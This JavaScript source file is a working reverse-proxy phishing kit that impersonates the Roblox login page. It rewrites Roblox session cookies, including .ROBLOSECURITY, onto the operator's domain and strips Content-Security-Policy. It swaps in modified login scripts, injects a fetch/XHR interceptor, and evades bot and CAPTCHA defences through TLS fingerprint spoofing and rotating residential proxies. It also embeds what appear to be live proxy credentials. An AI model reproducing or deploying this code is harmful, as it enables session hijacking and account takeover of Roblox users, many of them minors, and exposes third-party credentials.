const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { spawn, execFile } = require('child_process');
const crypto = require('crypto');
const path = require('path');

const app = express();

console.log('='.repeat(60));
console.log('🔒 ROBLOX LOGIN PROXY');
console.log('='.repeat(60));

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE (for ALL requests - TLS fingerprint spoofing)
// ─────────────────────────────────────────────────────────────
let CURL_BIN = 'curl';
function detectCurlBin() {
    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl_chrome116', 'curl-impersonate-chrome', 'curl'];
    let idx = 0;
    function tryNext() {
        if (idx >= candidates.length) return;
        const bin = candidates[idx++];
        execFile(bin, ['--version'], { timeout: 3000 }, (err) => {
            if (!err) {
                CURL_BIN = bin;
                if (bin === 'curl') {
                    console.warn('⚠️  curl-impersonate NOT found — using plain curl.');
                } else {
                    console.log(`✅ curl-impersonate: ${bin}`);
                }
            } else { tryNext(); }
        });
    }
    tryNext();
}
detectCurlBin();

// ─────────────────────────────────────────────────────────────
// RESIDENTIAL PROXIES (optional - for additional IP rotation)
// ─────────────────────────────────────────────────────────────
const RESIDENTIAL_PROXIES = [
    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
];
let proxyIndex = 0;
function getNextProxy() {
    const p = RESIDENTIAL_PROXIES[proxyIndex];
    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
    return p;
}

// ─────────────────────────────────────────────────────────────
// SHARED AGENTS (fallback only)
// ─────────────────────────────────────────────────────────────
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, timeout: 30000 });

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

// ─────────────────────────────────────────────────────────────
// SERVE MODIFIED JS FILES
// ─────────────────────────────────────────────────────────────
app.use('/js', express.static(path.join(__dirname, 'modified-js')));

// ─────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────
function generateProxyMetaTags() {
    const sid    = crypto.randomBytes(16).toString('hex');
    const secure = crypto.createHash('md5').update(sid).digest('hex');
    return `<meta name="proxy" value="${sid}">` +
           `<meta name="token" value="${sid}">` +
           `<meta name="secure" value="${secure}">` +
           `<meta name="meta" value="">`;
}

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(c =>
        c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
         .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
    );
}

function getDeviceId(req) {
    const m = (req.headers.cookie || '').match(/rbx-device-id=([^;]+)/);
    return m ? m[1] : crypto.randomBytes(32).toString('hex');
}

function setCors(res, origin) {
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    res.set('Access-Control-Allow-Headers', [
        'Content-Type', 'x-csrf-token', 'Authorization',
        'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
        'Accept', 'Accept-Language', 'Accept-Encoding',
        ...CHALLENGE_HEADERS
    ].join(', '));
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
}

// ─────────────────────────────────────────────────────────────
// LOGGING
// ─────────────────────────────────────────────────────────────
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const skip = ['/www/e.png', '/pe'];
        if (!skip.some(s => req.path.includes(s))) {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${Date.now() - start}ms)`);
        }
    });
    next();
});

// ─────────────────────────────────────────────────────────────
// CORS PREFLIGHT
// ─────────────────────────────────────────────────────────────
app.options('*', (req, res) => {
    setCors(res, req.headers['origin'] || `https://${req.headers.host}`);
    res.sendStatus(200);
});

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE REQUEST FUNCTION (for ALL requests)
// ─────────────────────────────────────────────────────────────
function makeCurlRequest(method, url, headers, body, useProxy = false) {
    return new Promise((resolve, reject) => {
        const args = [
            '--silent', '--include', '--max-time', '45',
            '--http2', '--compressed',
            '-X', method.toUpperCase()
        ];

        // Add optional proxy
        if (useProxy) {
            const proxyUrl = getNextProxy();
            args.push('-x', proxyUrl);
        }

        // Add headers (skip ones curl handles automatically)
        const skipHeaders = new Set([
            'host', 'content-length', 'transfer-encoding',
            'connection', 'accept-encoding', 'user-agent'
        ]);

        for (const [k, v] of Object.entries(headers)) {
            if (!skipHeaders.has(k.toLowerCase())) {
                args.push('-H', `${k}: ${v}`);
            }
        }

        // Add User-Agent if provided
        if (headers['user-agent']) {
            args.push('-H', `User-Agent: ${headers['user-agent']}`);
        }

        // Add body for POST/PUT/PATCH
        if (body && body.length > 0) {
            args.push('--data-binary', '@-');
        }

        args.push(url);

        const child = spawn(CURL_BIN, args, { timeout: 50000 });

        if (body && body.length > 0) {
            child.stdin.write(body);
        }
        child.stdin.end();

        const chunks = [];
        let stderr = '';

        child.stdout.on('data', c => chunks.push(c));
        child.stderr.on('data', c => { stderr += c.toString(); });

        child.on('error', (err) => {
            reject(new Error(`curl spawn error: ${err.message}`));
        });

        child.on('close', (code) => {
            if (code !== 0 && code !== null) {
                return reject(new Error(`curl exited with code ${code}. stderr: ${stderr}`));
            }

            const buf = Buffer.concat(chunks);
            const raw = buf.toString('binary');

            // Find the last HTTP response (handle redirects)
            const httpRe = /HTTP\/[^\s]+\s+\d+/g;
            let lastMatch = null, m;
            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;

            if (!lastMatch) {
                return reject(new Error(`No HTTP response found. stderr: ${stderr}`));
            }

            const hdrStart = lastMatch.index;
            const hdrEnd = raw.indexOf('\r\n\r\n', hdrStart);

            if (hdrEnd === -1) {
                return reject(new Error('Malformed HTTP response - no header end'));
            }

            const statusLine = raw.substring(hdrStart, raw.indexOf('\r\n', hdrStart));
            const statusCode = parseInt(statusLine.match(/\d{3}/)?.[0] || '0', 10);

            // Parse headers
            const parsedHdrs = {};
            const headerLines = raw.substring(hdrStart, hdrEnd).split('\r\n').slice(1);
            for (const line of headerLines) {
                const ci = line.indexOf(':');
                if (ci < 1) continue;
                const k = line.substring(0, ci).trim().toLowerCase();
                const v = line.substring(ci + 1).trim();
                if (parsedHdrs[k] !== undefined) {
                    parsedHdrs[k] = Array.isArray(parsedHdrs[k])
                        ? [...parsedHdrs[k], v]
                        : [parsedHdrs[k], v];
                } else {
                    parsedHdrs[k] = v;
                }
            }

            const responseBody = buf.slice(hdrEnd + 4);
            resolve({ statusCode, headers: parsedHdrs, body: responseBody });
        });
    });
}

// ─────────────────────────────────────────────────────────────
// LOGIN HANDLER (/v2/login and /v3/login)
// Uses curl-impersonate for TLS fingerprint spoofing
// ─────────────────────────────────────────────────────────────
async function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, useProxy = false) {
    const headers = {
        'Content-Type':    'application/json;charset=UTF-8',
        'Accept':          'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
        'User-Agent':      ua || BROWSER_UA,
    };

    const forward = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS];
    for (const h of forward) {
        if (extraHeaders[h]) headers[h] = extraHeaders[h];
    }

    if (cookieHeader) headers['Cookie'] = cookieHeader;
    if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

    const url = 'https://auth.roblox.com/v2/login';
    const body = Buffer.from(bodyStr, 'utf8');

    return await makeCurlRequest('POST', url, headers, body, useProxy);
}

async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 3) {
    let lastErr;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            // Try without proxy first, then with proxy on retries
            const useProxy = i > 0;
            return await doLoginRequest(bodyStr, cookie, csrf, ua, extra, useProxy);
        } catch (e) {
            lastErr = e;
            console.log(`   Retry ${i + 1}/${maxRetries + 1}: ${e.message}`);
            await new Promise(r => setTimeout(r, 500 * (i + 1)));
        }
    }
    throw lastErr;
}

function forwardLoginResponse(res, result, host, origin, deviceId) {
    const cleanHost = host.replace(/^www\./, '');
    setCors(res, origin);

    for (const h of ['x-csrf-token', 'content-type', 'cache-control', ...CHALLENGE_HEADERS]) {
        if (result.headers[h]) res.set(h, result.headers[h]);
    }

    let cookies = rewriteCookies(result.headers['set-cookie'], host) || [];
    if (deviceId) cookies.push(`rbx-device-id=${deviceId}; Domain=.${cleanHost}; Path=/; Secure; SameSite=None`);
    if (cookies.length) res.set('Set-Cookie', cookies);

    const hasRoblo = (result.headers['set-cookie'] || []).some(c =>
        Array.isArray(c) ? c.some(sc => sc.includes('.ROBLOSECURITY')) : c.includes('.ROBLOSECURITY')
    );
    if (hasRoblo) console.log('✅ .ROBLOSECURITY received — login success!');
    else if (result.statusCode === 200) console.log('⚠️  200 but no .ROBLOSECURITY');

    res.status(result.statusCode).send(result.body);
}

async function loginHandler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const host     = req.headers.host || 'localhost';
    const origin   = req.headers['origin'] || `https://${host}`;
    const ua       = req.headers['user-agent'] || BROWSER_UA;
    const cookies  = req.headers['cookie'] || '';
    const deviceId = getDeviceId(req);

    const hasChallenge = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    console.log(`🔑 LOGIN | Challenge: ${hasChallenge ? 'YES' : 'NO'} | curl: ${CURL_BIN}`);

    try {
        const bodyStr = req.body.toString('utf8');

        // If browser already has challenge solution, send it directly
        if (hasChallenge) {
            let result = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
            if (result.statusCode === 403 && result.headers['x-csrf-token']) {
                let cookieHeader = cookies;
                if (result.headers['set-cookie']) {
                    const extra = [].concat(result.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }
                result = await doLoginWithRetry(bodyStr, cookieHeader, result.headers['x-csrf-token'], ua, req.headers);
            }
            return forwardLoginResponse(res, result, host, origin, deviceId);
        }

        // Step 1: get CSRF token
        const step1 = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
        console.log(`   Step 1: ${step1.statusCode}`);
        if (!step1.headers['x-csrf-token']) return forwardLoginResponse(res, step1, host, origin, deviceId);

        // Step 2: retry with CSRF
        let cookieHeader = cookies;
        if (step1.headers['set-cookie']) {
            const extra = [].concat(step1.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }
        const step2 = await doLoginWithRetry(bodyStr, cookieHeader, step1.headers['x-csrf-token'], ua, req.headers);
        console.log(`   Step 2: ${step2.statusCode}`);

        // Step 3: if token rotated, retry once more
        let final = step2;
        if (step2.statusCode === 403 && step2.headers['x-csrf-token'] && step2.headers['x-csrf-token'] !== step1.headers['x-csrf-token']) {
            if (step2.headers['set-cookie']) {
                const extra = [].concat(step2.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }
            final = await doLoginWithRetry(bodyStr, cookieHeader, step2.headers['x-csrf-token'], ua, req.headers);
            console.log(`   Step 3: ${final.statusCode}`);
        }

        if (final.statusCode === 200) console.log('✅ LOGIN SUCCESS');
        else if (final.headers['rblx-challenge-id']) console.log('🧩 Challenge required');
        else console.log(`❌ Login failed: ${final.statusCode}`);

        forwardLoginResponse(res, final, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
}

app.use('/v2/login', express.raw({ type: '*/*' }), loginHandler);
app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);

// ─────────────────────────────────────────────────────────────
// UNIVERSAL CURL-IMPERSONATE PROXY (for ALL API routes)
// ─────────────────────────────────────────────────────────────
function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
    return async (req, res) => {
        const origin = req.headers['origin'] || `https://${req.headers.host}`;
        setCors(res, origin);

        // Build target URL
        let targetPath = req.path;
        if (pathPrefix) {
            targetPath = pathPrefix + req.path;
        }
        const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
        const targetUrl = `https://${targetHost}${targetPath}${qs}`;

        // Build headers
        const headers = {
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
            'Accept':          req.headers['accept'] || 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        };

        if (req.headers['content-type']) {
            headers['Content-Type'] = req.headers['content-type'];
        }
        if (req.headers['cookie']) {
            headers['Cookie'] = req.headers['cookie'];
        }
        if (req.headers['x-csrf-token']) {
            headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
        }
        if (req.headers['rbx-device-id']) {
            headers['rbx-device-id'] = req.headers['rbx-device-id'];
        }
        if (req.headers['x-bound-auth-token']) {
            headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];
        }

        // Forward challenge headers
        for (const h of CHALLENGE_HEADERS) {
            if (req.headers[h]) headers[h] = req.headers[h];
        }

        // Get body for POST/PUT/PATCH
        let body = null;
        if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
            body = await new Promise((resolve) => {
                const bufs = [];
                req.on('data', c => bufs.push(c));
                req.on('end', () => resolve(Buffer.concat(bufs)));
            });
        }

        try {
            const result = await makeCurlRequest(
                req.method,
                targetUrl,
                headers,
                body,
                useResidentialProxy
            );

            // Forward response headers
            const skipHdrs = new Set([
                'content-security-policy', 'content-security-policy-report-only',
                'x-content-security-policy', 'transfer-encoding', 'connection',
                'content-encoding', 'keep-alive', 'proxy-authenticate',
                'proxy-authorization', 'te', 'trailers', 'upgrade'
            ]);

            for (const [k, v] of Object.entries(result.headers)) {
                if (skipHdrs.has(k)) continue;
                if (k === 'set-cookie') {
                    res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
                } else {
                    try { res.set(k, v); } catch (_) {}
                }
            }

            res.status(result.statusCode).send(result.body);

        } catch (err) {
            console.error(`[curl-proxy:${targetHost}] ❌ ${req.method} ${req.path} | ${err.message}`);
            if (!res.headersSent) {
                res.status(502).json({ error: 'Proxy error', message: err.message });
            }
        }
    };
}

// ─────────────────────────────────────────────────────────────
// ROUTE MAP
// ─────────────────────────────────────────────────────────────

// Arkose Labs — curl-impersonate with residential proxy (high security)
const ARKOSE_ROUTES = [
    ['/arkose-api',     'https://roblox-api.arkoselabs.com'],
    ['/arkose-client',  'https://client-api.arkoselabs.com'],
    ['/arkose-cdn',     'https://cdn.arkoselabs.com'],
    ['/arkose-fc',      'https://fc.arkoselabs.com'],
    ['/arkose-game',    'https://game.arkoselabs.com'],
    ['/arkose-assets',  'https://assets.arkoselabs.com'],
    ['/arkose-images',  'https://roblox-images.arkoselabs.com'],
    ['/captcha-rbxcdn', 'https://captcha.rbxcdn.com'],
    ['/apis-rbxcdn',    'https://apis.rbxcdn.com'],
];

// Standard Roblox API routes — NOW USING CURL-IMPERSONATE
const API_ROUTES = [
    // Challenge system (critical for login)
    ['/challenge',                        'apis.roblox.com'],
    ['/account-security-service',         'apis.roblox.com', '/account-security-service'],
    ['/proof-of-work-service',            'apis.roblox.com', '/proof-of-work-service'],
    ['/auth-token-service',               'apis.roblox.com', '/auth-token-service'],
    ['/hba-service',                      'apis.roblox.com', '/hba-service'],
    ['/rotating-client-service',          'apis.roblox.com', '/rotating-client-service'],

    // Experimentation & config
    ['/product-experimentation-platform', 'apis.roblox.com', '/product-experimentation-platform'],
    ['/universal-app-configuration',      'apis.roblox.com', '/universal-app-configuration'],
    ['/guac-v2',                          'apis.roblox.com', '/guac-v2'],

    // OTP & captcha
    ['/otp-service',                      'apis.roblox.com', '/otp-service'],
    ['/captcha',                          'apis.roblox.com', '/captcha'],

    // Core APIs
    ['/v1/account-information',           'accountinformation.roblox.com'],
    ['/v2/account-information',           'accountinformation.roblox.com'],
    ['/v1/users',                         'users.roblox.com'],
    ['/v2/users',                         'users.roblox.com'],
    ['/v1/avatar',                        'avatar.roblox.com'],
    ['/v2/avatar',                        'avatar.roblox.com'],
    ['/v1/badges',                        'badges.roblox.com'],
    ['/v1/catalog',                       'catalog.roblox.com'],
    ['/v2/catalog',                       'catalog.roblox.com'],
    ['/v1/economy',                       'economy.roblox.com'],
    ['/v2/economy',                       'economy.roblox.com'],
    ['/v1/friends',                       'friends.roblox.com'],
    ['/v2/friends',                       'friends.roblox.com'],
    ['/v1/presence',                      'presence.roblox.com'],
    ['/v2/presence',                      'presence.roblox.com'],
    ['/v1/thumbnails',                    'thumbnails.roblox.com'],
    ['/v2/thumbnails',                    'thumbnails.roblox.com'],
    ['/v1/groups',                        'groups.roblox.com'],
    ['/v2/groups',                        'groups.roblox.com'],
    ['/v1/metrics',                       'metrics.roblox.com'],
    ['/v1/games',                         'games.roblox.com'],
    ['/v2/games',                         'games.roblox.com'],

    // Reporting (non-critical)
    ['/game/report-event',                'www.roblox.com'],
    ['/ecsv2-api',                        'ecsv2.roblox.com'],
    ['/client-telemetry',                 'client-telemetry.roblox.com'],
    ['/ephemeralcounters',                'ephemeralcounters.roblox.com'],
];

// Register Arkose routes with residential proxy
for (const [prefix, target] of ARKOSE_ROUTES) {
    const targetHost = target.replace(/^https?:\/\//, '').replace(/\/+$/, '');
    app.use(prefix, createCurlProxy(targetHost, '', true));
}

// Register API routes with curl-impersonate (no residential proxy by default)
for (const [prefix, target, pathPrefix] of API_ROUTES) {
    app.use(prefix, createCurlProxy(target, pathPrefix, false));
}

// ─────────────────────────────────────────────────────────────
// INJECTED SCRIPT
// ─────────────────────────────────────────────────────────────
const INJECTED_SCRIPT = `<script>
(function() {
    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        init = init || {};
        init.credentials = 'include';
        return _fetch.call(this, resource, init).then(function(response) {
            var challengeId       = response.headers.get('rblx-challenge-id');
            var challengeType     = response.headers.get('rblx-challenge-type');
            var challengeMetadata = response.headers.get('rblx-challenge-metadata');
            if (challengeId) {
                window.__rblxChallengeId   = challengeId;
                window.__rblxChallengeType = challengeType;
                if (challengeMetadata) {
                    try {
                        var meta = JSON.parse(atob(challengeMetadata));
                        window.__rblxUserId           = meta.userId;
                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
                    } catch(e) {}
                }
            }
            return response;
        });
    };
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this.__url = url;
        return _open.apply(this, arguments);
    };
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
        this.withCredentials = true;
        return _send.apply(this, arguments);
    };
    console.log('[Proxy] Interceptor loaded');
})();
</script>`;

// ─────────────────────────────────────────────────────────────
// MAIN PAGE HANDLER
// ─────────────────────────────────────────────────────────────
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (reqPath) => (reqPath === '/' ? '/login' : reqPath),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept',          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const host   = req.headers.host || 'localhost';
            const origin = req.headers['origin'] || `https://${host}`;

            // Strip CSP so browser doesn't block anything
            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            delete proxyRes.headers['x-content-security-policy'];

            // Rewrite cookies to our domain
            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies → .${host.replace(/^www\./, '')}`);
            }

            res.setHeader('access-control-allow-origin',      origin);
            res.setHeader('access-control-allow-credentials', 'true');

            const ct = proxyRes.headers['content-type'] || '';
            if (!ct.includes('text/html')) return buffer;

            let body = buffer.toString('utf8');

            // Replace the 4 Roblox JS files with our modified local versions
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-EnvironmentUrls\.js[^"']*/g,
                `/js/EnvironmentUrls.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-CoreUtilities\.js[^"']*/g,
                `/js/CoreUtilities.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-Challenge\.js[^"']*/g,
                `/js/Challenge.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
                `/js/ReactLogin.js`
            );
            // Handle ?v=N versioned references too
            body = body.replace(/\/js\/ReactLogin\.js\?v=\d+/g, '/js/ReactLogin.js');

            // Inject meta tags + interceptor script
            const metaTags = generateProxyMetaTags();
            body = body.replace('<head', `<head>${metaTags}${INJECTED_SCRIPT}`);

            return body;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) res.status(502).send('Proxy error');
        }
    }
}));

// ─────────────────────────────────────────────────────────────
// START
// ─────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📁 Modified JS from: ${path.join(__dirname, 'modified-js')}`);
    console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
    console.log(`🔒 ALL requests now use curl-impersonate for TLS fingerprint spoofing`);
});
